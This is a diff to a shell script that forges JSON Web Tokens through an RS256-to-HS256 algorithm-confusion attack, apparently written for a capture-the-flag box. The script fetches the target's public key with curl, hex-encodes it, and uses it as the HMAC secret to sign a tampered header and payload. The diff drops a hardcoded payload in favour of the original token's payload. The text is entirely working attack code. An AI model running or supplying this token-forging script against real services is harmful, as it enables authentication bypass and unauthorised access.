@@ -3,7 +3,6 @@ modifiedheader="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
 modifiedheaderfile="modifiedheader.txt"
 modifiedsecretfile="modifiedsecret.txt"
 newjwtfile="newjwt.txt"
-payload="eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNTk1MzY0MjEzLCJleHAiOjE1OTUzNjQzMzMsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ"
 payloadfile="payload.txt"
 pemfile="public.pem"
 hexpemfile="hexpublic.pem"
@@ -18,7 +17,6 @@ read originaltoken
 echo ${originaltoken} | cut -d "." -f 2 $2 > ${payloadfile}
 curl "http://${ip}/public.pem" -o ${pemfile}
 echo "${modifiedheader}" > ${modifiedheaderfile}
-echo "${payload}" > ${payloadfile}
 cat ${pemfile} | xxd -p | tr -d "\\n" > ${hexpemfile}
 echo -n "$(cat ${modifiedheaderfile}).$(cat ${payloadfile})" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat ${hexpemfile}) | awk '{print $2}' > ${hexkeyfile}
 export HEXKEY=$(cat ${hexkeyfile})
